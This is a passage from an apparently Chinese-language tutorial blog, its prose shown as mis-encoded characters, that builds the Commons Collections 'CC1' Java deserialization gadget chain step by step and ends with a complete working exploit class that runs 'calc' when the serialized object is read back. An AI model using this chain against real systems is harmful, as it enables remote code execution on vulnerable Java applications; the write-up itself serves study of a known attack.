</code></pre><p>ä½†æ˜¯åœ¨æ‰§è¡Œåå‘ç°è¿˜æ˜¯åˆ©ç”¨å¤±è´¥ï¼Œå°è¯•DebugæŸ¥çœ‹é—®é¢˜å­˜åœ¨ï¼ˆå°è¯•åœ¨æ•°ç»„éå†å¤„æ‰“æ–­ç‚¹ï¼‰</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230916234016.png">â€‹ <img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230916233217.png"><p>è¿™é‡Œå­˜åœ¨çš„é—®é¢˜æ˜¯<code>memberType</code>â€‹ä¸ºç©ºï¼Œifåˆ¤æ–­ä¸ºå‡ï¼Œè€Œé€šè¿‡å‰é¢çš„ä»£ç å¯ä»¥å¤§æ¦‚çŒœæµ‹å‡º forå¾ªç¯éå†mapï¼Œè·å–çš„å˜é‡é€šè¿‡<code>getKey()</code>â€‹è·å–å®ƒçš„é”®å€¼å¯¹ä¸­çš„é”®ï¼Œè€Œ<code>memberTypes</code>â€‹é€šè¿‡æŸ¥çœ‹ä¸Šä¸‹æ–‡å¾—å‡ºå®ƒæ˜¯æˆåŠŸè·å–äº†æ³¨è§£ç±»å‹çš„<code>Annotation Type</code>â€‹å®ä¾‹ï¼Œä¹‹åè°ƒç”¨<code>memberTypes()</code>â€‹æ–¹æ³•ï¼Œä»¥æˆåŠŸè·å–æ³¨è§£çš„æˆå‘˜åç§°å’Œå¯¹åº”çš„æˆå‘˜ç±»å‹å°†å…¶å­˜å‚¨åœ¨<code>memberTypes</code>â€‹ä¸­ï¼Œæ¥ç€é€šè¿‡<code>memberTypes.get()</code>â€‹æŸ¥æ‰¾è¿™ä¸ªé”®æ˜¯å¦å­˜åœ¨</p><pre><code class="java">        Object o = declaredConstructor.newInstance(Override.class, decorate); // åˆå§‹åŒ–è¯¥å¯¹è±¡
</code></pre><p>ç”±äºä¸Šè¿°åœ¨å®ä¾‹åŒ–æ—¶ä¼ é€’çš„æ˜¯<code>Override.class</code>â€‹è¯¥ç±»ä¸­å•¥éƒ½æ²¡æœ‰ï¼Œä½†æ˜¯49ã€50è¡Œå­˜åœ¨ä¸¤ä¸ªï¼Œå¯ä»¥è¿›å…¥æŸ¥çœ‹</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230916234613.png">â€‹<p>è¿™é‡Œå¯ä»¥é€šè¿‡ä¼ é€’å…¶ä»–çš„æ³¨é‡Šç±»æ¥ç»•è¿‡è¿™ä¸ªé™åˆ¶</p><pre><code class="java">package cc;

import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class cc1 &#123;

    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, ClassNotFoundException, IOException &#123;

        Runtime transfromR = Runtime.getRuntime(); 
        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); 
        HashMap&lt;Object, Object&gt; testMap = new HashMap&lt;&gt;(); 
        testMap.put(&quot;value&quot;, &quot;value&quot;); // ç”±äºå®ƒæ˜¯é€šè¿‡kayæ¥åˆ¤æ–­ï¼Œæ‰€ä»¥è¦å¡«ä¸€ä¸ªå­˜åœ¨çš„key

        Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(testMap, null, invokerTransformer);

        Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); 
        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class); 
        declaredConstructor.setAccessible(true); 
        Object o = declaredConstructor.newInstance(Target.class, decorate); // è¿™é‡Œå¯ä»¥ä¼ å…¥Target.classï¼Œå®ƒå­˜åœ¨ä¸€ä¸ªvalueæ–¹æ³•

        serialize(o, &quot;cc1.ser&quot;); 

        deserialize(&quot;cc1.ser&quot;); 
&#125;
</code></pre><p>çœ‹ä¼¼é€»è¾‘æ­£ç¡®çš„ï¼Œä½†å®é™…ä¸Šè¿˜å­˜åœ¨å¾ˆå¤šé—®é¢˜ï¼Œå½“è¿è¡Œæ—¶è¿˜ä¼šæŠ¥é”™</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230917000529.png">å¾ˆæ˜¾ç„¶ä¼ å…¥çš„classç±»å¯¹è±¡ä¸æ”¯æŒexecæ–¹æ³•ï¼Œæˆ–è€…è¯´ä¼ å…¥çš„ä¸æ˜¯ä¸€ä¸ª`java.lang.Runtime`â€‹è€Œæ˜¯ä¸€ä¸ª`java.lang.String`â€‹ <img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230917000917.png">é€šè¿‡æ–­ç‚¹æŸ¥çœ‹ä¹Ÿå¯ä»¥çœ‹å‡º<h3 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h3><p>å½“ç„¶è¿™é‡Œçš„é—®é¢˜å¯ä»¥ç¨å¾®æ€»ç»“ä¸€ä¸‹</p><pre><code class="java">1. Runtimeå¯¹è±¡æ˜¯é€šè¿‡Runtime.getRuntimeè·å–çš„ï¼Œæ— æ³•è¿›è¡Œåºåˆ—åŒ–æ“ä½œï¼ˆæ²¡æœ‰ç»§æ‰¿Serializableï¼‰

2. setValue()ä¸­éœ€è¦ä¼ å…¥çš„æ˜¯Runtimeå¯¹è±¡,ä½†æ˜¯è¿™é‡Œä½¿ç”¨çš„æ˜¯ new AnnotationInvocationHandler()

memberValue.setValue(
    new AnnotationTypeMismatchExceptionProxy(
        value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(
            annotationType.members().get(name)));

    è¿™é‡ŒsetValueå‡½æ•°çš„å‚æ•°ä½¿ç”¨çš„new AnnotationTypeMismatchExceptionProxy()ä¼ å…¥ï¼Œæœ€ç»ˆè¿›å…¥åˆ°checkSetValueåä½¿ç”¨çš„valueæ˜¯new AnnotationTypeMismatchExceptionProxy(),ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œå¾—æ”¹æˆRuntime.classç±»å‹ï¼Œä½†æ˜¯å¦‚æœæŸ¥çœ‹è¿‡æ–­ç‚¹åå‘ç°æ— æ³•æ§åˆ¶çš„ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡å¦ä¸€ä¸ªç±»new ConstantTransformer()ï¼Œå®ƒä¸è®ºä¼ å…¥ä»€ä¹ˆè¾“å…¥éƒ½ä¼šæŒ‰ç…§å†…éƒ¨çš„å€¼è¿›è¡Œè¿”å›

3. åœ¨readObject()å‡½æ•°ä¸­ï¼Œå­˜åœ¨å¾ˆå¤šifæ¡ä»¶

    1. if (memberType != null)

        memberValue.getKey() è·å–å®ƒçš„é”®å€¼å¯¹çš„é”®
        memberTypes.get()ä¸­æŸ¥æ‰¾è¿™ä¸ªé”®æ˜¯å¦å­˜åœ¨
        memberType æŸ¥æ‰¾ä¸åˆ°æ‰€ä»¥è°ƒç”¨å¤±è´¥

        æ‰€ä»¥å¿…é¡»æ‰¾ä¸€ä¸ªæœ‰æˆå‘˜æ–¹æ³•çš„classï¼ŒåŒæ—¶æ•°ç»„çš„keyè¿˜è¦æ”¹æˆå®ƒï¼ˆæ³¨è§£å¯¹è±¡ï¼‰çš„æˆå‘˜æ–¹æ³•åå­—

    2. if (!(memberType.isInstance(value) || value instanceof ExceptionProxy))
        åˆ¤æ–­æ•°æ®æ˜¯å¦èƒ½å¤Ÿå¼ºè½¬ï¼Œè¿™é‡Œå¦‚æœç¬¬ä¸€ä¸ªifè¿›å…¥äº†é‚£ä¹ˆè¿™é‡Œä¹Ÿè‚¯å®šæœ¬èƒ½å¼ºè½¬
</code></pre><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>è¦æƒ³çªç ´<code>new AnnotationInvocationHandler()</code>â€‹ å¯ä»¥é€šè¿‡è¯¥ç»™ç±»ä¼ å…¥<code>Runtime.class</code>â€‹ï¼Œé€šè¿‡<code>transform</code>â€‹æ–¹æ³•å°†è¯¥å€¼è¿”å›ï¼ˆ å³è¯¥ç‚¹æ˜¯å¯æ§çš„ ï¼‰</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230917001654.png">â€‹â€‹â€‹ <img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230917001822.png">â€‹<p>ç†è§£è¿™ä¸€ç‚¹åå°±å¯ä»¥å¼€å§‹æ„é€ </p><pre><code class="java">    Class&lt;Runtime&gt; aClass = Runtime.class;
    Method getRuntime = aClass.getMethod(&quot;getRuntime&quot;, null);
    Runtime r = (Runtime) getRuntime.invoke(null);
    Method exec = aClass.getMethod(&quot;exec&quot;, String.class);
    exec.invoke(r, &quot;calc&quot;);
</code></pre><p>è¿™æ˜¯æ­£å¸¸çš„åå°„ä»£ç†ï¼Œä½†æ˜¯å¾—è½¬æ¢æˆ<code>Transformer</code>â€‹å¯è¯†åˆ«ç±»å‹ï¼Œé€šè¿‡ä¸€å¼€å§‹çš„<code>InvokerTransformer</code>â€‹çš„<code>transform</code>â€‹æ–¹æ³•å®ç°</p><pre><code class="java">    Object constant = new ConstantTransformer(Runtime.class).transform(Runtime.class);
    Method getMethods = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(constant);
    Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getMethods);
    InvokerTransformer exec = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);
</code></pre><p>è™½ç„¶è½¬æˆäº†<code>Transformer</code>â€‹ å¯æ˜¯åˆ«ï¼Œä½†æ˜¯å§‹ç»ˆæ— æ³•æ§åˆ¶<code>setValue</code>â€‹çš„å‚æ•°</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230917004845.png">DebugæŸ¥çœ‹åå‘ç°å§‹ç»ˆä¸æ˜¯æƒ³è¦çš„Runtimeç±»å‹ï¼Œè¿™æ—¶è¿˜éœ€è¦å†æ¬¡è°ƒç”¨å¦ä¸€ä¸ªç±» â€‹`ChainedTransformer`â€‹<h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230917005151.png">â€‹<p>å¯ä»¥çœ‹åˆ°å®ƒéœ€è¦ä¸€ä¸ª<code>Transformer[]</code>â€‹æ¥æ”¶</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230917005225.png">â€‹<p>è€Œå®ƒçš„ä¸»è¦åŠŸèƒ½å°±æ˜¯é€šè¿‡è°ƒç”¨<code>transform()</code>â€‹å¾ªç¯å®ç°æ•°ç»„ä¸­å¯¹è±¡çš„transformæ–¹æ³•ï¼Œæ­¤æ—¶é—®é¢˜æ‰ç®—è§£å†³å®Œæˆ</p><pre><code class="java">Transformer[] transformers = &#123;
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
    new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
    new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
&#125;; 
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // é€šè¿‡é€’å½’è°ƒç”¨transformæ–¹æ³•
</code></pre><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230917005607.png">â€‹<p>é¦–å…ˆå°±æ˜¯ä¼ å…¥<code>new AnnotationInvocationHandler()</code>â€‹å¯¹è±¡ï¼Œé€šè¿‡è°ƒç”¨<code>ConstantTransformer</code>â€‹çš„<code>transform</code>â€‹æ–¹æ³•æˆåŠŸè¿”å›äº†<code>java.lang.Runtime</code>â€‹ä¹‹åå°±æ˜¯æ­£å¸¸çš„é€šè¿‡<code>InvokerTransformer</code>â€‹çš„<code>transform</code>â€‹æ¥è°ƒç”¨ï¼Œæœ€ç»ˆå®ç°å‘½ä»¤æ‰§è¡Œ</p><h2 id="é“¾è·¯æ•´ç†"><a href="#é“¾è·¯æ•´ç†" class="headerlink" title="é“¾è·¯æ•´ç†"></a>é“¾è·¯æ•´ç†</h2><ol><li><p>å› ä¸ºæœ€ç»ˆæ˜¯é€šè¿‡è°ƒç”¨ç›®æ ‡çš„<code>readObject()</code>â€‹ä»è€Œè§¦å‘ä¸€ç³»åˆ—ååº”ï¼Œæœ€ç»ˆæ‰§è¡Œ<code>InvokerTransformer.transform()</code>â€‹ï¼Œå°±éœ€è¦è¿›è¡Œåºåˆ—åŒ–æ“ä½œå’Œååºåˆ—åŒ–æ“ä½œï¼Œæ‰€ä»¥è¿™äº›æ“ä½œéƒ½éœ€è¦æ”¯æŒåºåˆ—åŒ–æ“ä½œï¼Œè€Œ<code>Runtime.getRuntime()</code>â€‹å¾ˆæ˜¾ç„¶ä¸æ”¯æŒåºåˆ—åŒ–æ“ä½œï¼Œéœ€è¦è¿›è¡Œåå°„è·å–ï¼Œè€Œåå°„åˆå¿…é¡»å¾—æ˜¯<code>InvokerTransformer.transform()</code>â€‹æ‰€æ”¯æŒçš„ ( æœ€ç»ˆçš„è§¦å‘ç‚¹åœ¨è¿™é‡Œ )</p></li><li><p>åˆ›å»ºæ‰€éœ€è¦çš„ç±»å¯¹è±¡</p><ol><li>ç”±äºæ— æ³•æ§åˆ¶<code>setValue()</code>â€‹çš„å‚æ•°ï¼Œæ‰€ä»¥éœ€è¦å€ŸåŠ©ä¸€ä¸ªç±»<code>CostantTransform</code>â€‹ï¼Œé€šè¿‡ä½¿ç”¨å®ƒçš„<code>transform</code>â€‹æ–¹æ³•ï¼Œä¸è®ºä¼ é€’è°ï¼Œéƒ½ä¼šè¾“å‡ºï¼Œè¿™é‡Œæˆ‘ä»¬æƒ³è¦çš„æ˜¯<code>Runtime.class</code>â€‹ï¼Œé€šè¿‡å°†<code>Runtime.class</code>â€‹ä¼ é€’ç»™è¯¥ç±»ï¼Œä»è€Œè·å¾—å®ƒæœ¬èº«</li><li>å¦‚æœä½¿ç”¨çš„æ˜¯å¸¸è§„æƒ³æ³•ï¼Œå³å…ˆé€šè¿‡<code>new CostantTransform()</code>â€‹çš„<code>transform</code>â€‹è¿”å›<code>java.lang.Runtime</code>â€‹ä¹‹ååœ¨é€šè¿‡<code>InvokerTransform</code>â€‹è°ƒç”¨<code>transform</code>â€‹å‰è€…è¿”å›ç±»ï¼Œæ­£å¸¸æ€è·¯çœ‹ç€æ˜¯å¯è¡Œçš„ï¼Œä½†æ˜¯<code>setValue()</code>â€‹ä¼šå¼ºåˆ¶ä½¿ç”¨<code>new AnnotationInvocationHandler()</code>â€‹å®ƒçš„<code>transform</code>â€‹æ–¹æ³•ï¼Œä¹‹åå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼ˆå› ä¸ºä¼ é€’çš„æ˜¯<code>new CostantTransform()</code>â€‹å®ƒå¹¶æ²¡æœ‰<code>exec</code>â€‹è¿™ä¸ªæ–¹æ³•ï¼‰</li><li>æ‰€ä»¥è¿™é‡Œè¿˜éœ€è¦å€ŸåŠ©å¦ä¸€ä¸ªç±»<code>ChainedTransformer</code>â€‹ï¼Œå®ƒéœ€è¦ä¼ å…¥ä¸€ä¸ªæ•°ç»„ï¼Œå®ƒä¼šå°†æ•°ç»„ä¸­å‰è€…çš„è¾“å‡ºå½“åšåè€…çš„è¾“å…¥ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œæ— éœ€åœ¨è€ƒè™‘<code>setValue()</code>â€‹çš„å‚æ•°ï¼Œè€Œè€ƒè™‘åªéœ€è¦æ§åˆ¶ç¬¬ä¸€ä¸ªè¾“å‡ºçš„ç»“æœæ˜¯<code>java.lang.Runtime</code>â€‹å³å¯ï¼Œç”±æ­¤ï¼Œä¾¿æ„æˆä»¥ä¸‹ä»£ç </li></ol></li></ol><pre><code class="java">Transformer[] transformers = &#123;
    new ConstantTransformer(Runtime.class), // è°ƒç”¨è¯¥ç±»çš„transformæ–¹æ³•è¿”å›è¯¥ç±»æœ¬èº«
    new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
    new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
    new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
&#125;; // å°†ä¸Šè¿°åºåˆ—åŒ–æ“ä½œè½¬ä¸ºtransformeræ”¯æŒçš„

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // é€šè¿‡å¾ªç¯è°ƒç”¨
</code></pre><ol start="3"><li>å˜é‡åˆ›å»ºå®Œæˆåï¼Œéœ€è¦æœ‰ä¸€ä¸ªåœ°æ–¹èƒ½å¤Ÿè°ƒç”¨<code>ChainedTransformer</code>â€‹çš„<code>transform()</code>â€‹ï¼Œåœ¨<code>TransformedMap</code>â€‹ç±»ä¸­å­˜åœ¨ä¸€ä¸ª<code>checkSetValue()</code>â€‹ï¼Œå®ƒä¼šè°ƒç”¨<code>valueTransformer.transform(value)</code>â€‹ è€Œ<code>TransformedMap.decorate()</code>â€‹ä¼šè¿”å›ä¸€ä¸ª<code>new TransformedMap(map, keyTransformer, valueTransformer)</code>â€‹ï¼Œå…¶ä¸­å¯ä»¥æ§åˆ¶ç¬¬ä¸‰ä¸ªå‚æ•°ä¼ å…¥æˆ‘ä»¬è‡ªå®šä¹‰çš„<code>ChainedTransformer</code>â€‹ç±»å‹ï¼Œä»£ç å¦‚ä¸‹</li></ol><pre><code class="java">    HashMap&lt;Object, Object&gt; testMap = new HashMap&lt;&gt;(); // æ–°å»ºä¸€ä¸ªmap
    testMap.put(&quot;value&quot;, &quot;value&quot;); // æ·»åŠ æ•°æ®
    Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(testMap, null, chainedTransformer) // ç›¸å½“äº new TransformedMap(testMap, null, chainedTransformer)
</code></pre><ol start="4"><li><p>é‚£ä¹ˆï¼Œè¿™é‡Œçš„<code>valueTransformer</code>â€‹æ˜¯åœ¨é€šè¿‡<code>TransformedMap.decorate(testMap, null, chainedTransformer)</code>â€‹çš„ç¬¬ä¸‰ä¸ªå‚æ•°è¿›è¡Œä¼ é€’ï¼Œä¹Ÿå°±æ˜¯<code>chainedTransformer</code>â€‹èµ‹å€¼ç»™<code>valueTransformer</code>â€‹ï¼Œè€Œ<code>chainedTransformer</code>â€‹ä¸­å­˜æ”¾çš„å°±æ˜¯ä¸€äº›å®ä¾‹æ“ä½œï¼Œé€šè¿‡å®ƒæ¥æ‰§è¡Œ<code>transform()</code>â€‹å°±ç­‰äºæ‰§è¡Œ<code>chainedTransformer</code>â€‹æ•°ç»„ä¸­æ¯ä¸ªå…ƒç´ çš„<code>transform()</code>â€‹</p></li><li><p>é‚£ä¹ˆç°åœ¨è€ƒè™‘å¦‚ä½•åœ¨å“ªé‡Œè°ƒç”¨äº†<code>checkSetValue()</code>â€‹ï¼Œé€šè¿‡æŸ¥æ‰¾å‘ç°åœ¨<code>AbstractInputCheckedMapDecorator</code>â€‹ç±»ä¸­çš„<code>setValue()</code>â€‹è°ƒç”¨äº†<code>checkSetValue</code>â€‹ï¼Œé€šè¿‡æŸ¥çœ‹å…¶ç±»æ„é€ ï¼Œå‘ç°æ˜¯ä¸€ä¸ªMapæ•°ç»„</p></li><li><p>é€šè¿‡æŸ¥æ‰¾ä¼šå‘ç°<code>AnnotationInvocationHandler</code>â€‹ç±»ä¸­å­˜åœ¨ä¸€ä¸ªæ–¹æ³•<code>readObject()</code>â€‹ï¼Œè¿™ä¸ª<code>MapEntry</code>â€‹ çš„<code>setValue</code>â€‹æ–¹æ³•å¸¸ç”¨äºæ›´æ–°<code>Map</code>â€‹ä¸­é”®å€¼å¯¹ä¸­çš„å€¼ï¼ˆéå†æ›´æ–°ç­‰åœºæ™¯ï¼‰ï¼Œè¿™é‡Œéœ€è¦æ³¨é‡Šçš„æ˜¯è¯¥ç±»çš„æ„é€ å‡½æ•°æ²¡æœ‰ä»»ä½•ä¿®é¥°ç¬¦ï¼Œåªå…è®¸åœ¨åŒä¸€åŒ…å†…è°ƒç”¨ï¼Œæ‰€ä»¥å¾—é€šè¿‡åå°„è·å–è¯¥ç±»çš„æ„é€ å‡½æ•°</p></li><li><p>ç°åœ¨å°±è€ƒè™‘æœ‰ä¸€ä¸ªåœ°æ–¹èƒ½å¤Ÿéå†æ•°ç»„å¹¶ä¸”æ‰§è¡Œ<code>setValue</code>â€‹ï¼Œç»§ç»­æŸ¥æ‰¾ï¼Œå‘ç°<code>AnnotationInvocationHandler</code>â€‹ä¸­å­˜åœ¨çš„<code>readObject</code>â€‹æ–¹æ³•ä¸­å­˜åœ¨éå†æ•°ç»„å¹¶ä¸”æ‰§è¡Œ<code>setValue</code>â€‹çš„æ–¹æ³•ï¼Œè€Œå…¶ä¸­çš„åˆ¤æ–­æ¡ä»¶åªæ˜¯æ³¨é‡Šç±»ä¸­çš„æ–¹æ³•æ˜¯å¦å­˜åœ¨ï¼Œä»£ç å¦‚ä¸‹</p></li></ol><pre><code class="java">    Class&lt;?&gt; handlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); // å¯¹è±¡é€šè¿‡åå°„è·å–å…¶classå¯¹è±¡
    Constructor&lt;?&gt; declaredConstructor = handlerClass.getDeclaredConstructor(Class.class, Map.class); // è·å–å…¶æ„é€ æ–¹æ³•
    declaredConstructor.setAccessible(true); // å…³é—­CC1æ£€æµ‹
    Object o = declaredConstructor.newInstance(Target.class, decorate); // åˆå§‹åŒ–è¯¥å¯¹è±¡
</code></pre><ol start="8"><li>ç”±äº<code>readObject()</code>â€‹æ˜¯é€šè¿‡ååºåˆ—åŒ–æ“ä½œçš„ï¼Œæ‰€ä»¥éœ€è¦æ„é€ ä¸¤ä¸ªèƒ½å¤Ÿæ‰§è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å‡½æ•°</li></ol><pre><code class="java">    public static Object deserialize(String filename) throws IOException, ClassNotFoundException &#123;
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object o = ois.readObject();
        ois.close();
        return o;
    &#125;

    public static void serialize(Object obj, String filename) throws IOException &#123;
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename));
        oos.writeObject(obj);
        oos.close();
    &#125;
</code></pre><h2 id="æœ€ç»ˆä»£ç "><a href="#æœ€ç»ˆä»£ç " class="headerlink" title="æœ€ç»ˆä»£ç "></a>æœ€ç»ˆä»£ç </h2><pre><code class="java">package cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class cc1 &#123;

    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, ClassNotFoundException, IOException &#123;
        Transformer[] transformers = &#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
        &#125;; // å°†ä¸Šè¯‰åºåˆ—åŒ–æ“ä½œè½¬ä¸ºtransformeræ”¯æŒçš„
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // é€šè¿‡é€’å½’è°ƒç”¨

        HashMap&lt;Object, Object&gt; testMap = new HashMap&lt;&gt;(); // æ–°å»ºä¸€ä¸ªmap
        testMap.put(&quot;value&quot;, &quot;value&quot;); // æ·»åŠ æ•°æ®

        Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(testMap, null, chainedTransformer); // ä¼ å…¥mapå¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸éœ€è¦ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¼šæ‰§è¡Œtransformæ–¹æ³•ï¼Œä¼ å…¥ä¸Šé¢å®šä¸€ä¸ªTransformerå¯¹è±¡

        Class&lt;?&gt; handlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); // å¯¹è±¡é€šè¿‡åå°„è·å–å…¶classå¯¹è±¡
        Constructor&lt;?&gt; declaredConstructor = handlerClass.getDeclaredConstructor(Class.class, Map.class); // è·å–å…¶æ„é€ æ–¹æ³•
        declaredConstructor.setAccessible(true); // å…³é—­CC1æ£€æµ‹
        Object o = declaredConstructor.newInstance(Target.class, decorate); // åˆå§‹åŒ–è¯¥å¯¹è±¡

        serialize(o, &quot;cc1.ser&quot;); // åºåˆ—åŒ–è¯¥å¯¹è±¡
        deserialize(&quot;cc1.ser&quot;); // ååºåˆ—åŒ–è¯¥å¯¹è±¡ï¼Œç”±äºè¯¥å¯¹è±¡æ‰§è¡ŒreadObject()æ–¹æ³•ï¼Œä¼šéå†mapï¼ŒsetValueæ‰§è¡Œï¼Œå¯¼è‡´checkSetValueæ‰§è¡Œï¼Œæœ€ç»ˆè°ƒç”¨invokerTransformer.transformæ‰§è¡Œ
    &#125;
    public static Object deserialize(String filename) throws IOException, ClassNotFoundException &#123;
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object o = ois.readObject();
        ois.close();
        return o;
    &#125;

    public static void serialize(Object obj, String filename) throws IOException &#123;
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename));
        oos.writeObject(obj);
        oos.close();
    &#125;
&#125;
</code></pre><h1 id="ysoserial-cc1åˆ†æ"><a href="#ysoserial-cc1åˆ†æ" class="headerlink" title="ysoserial-cc1åˆ†æ"></a>ysoserial-cc1åˆ†æ</h1><p>å‰é¢çš„å¤§éƒ¨åˆ†ç›¸åŒï¼Œæ ¸å¿ƒä¸åŒå°±æ˜¯åœ¨</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230916122758.png">æ‰‹åŠ¨åˆ†æçš„æ˜¯`TransformedMap`â€‹ç±»ï¼Œè€Œysoserialä¸­çš„cc1ä½¿ç”¨çš„æ˜¯`LazyMap`â€‹<h2 id="ç±»åˆ†æ-1"><a href="#ç±»åˆ†æ-1" class="headerlink" title="ç±»åˆ†æ"></a>ç±»åˆ†æ</h2><h3 id="LazyMap"><a href="#LazyMap" class="headerlink" 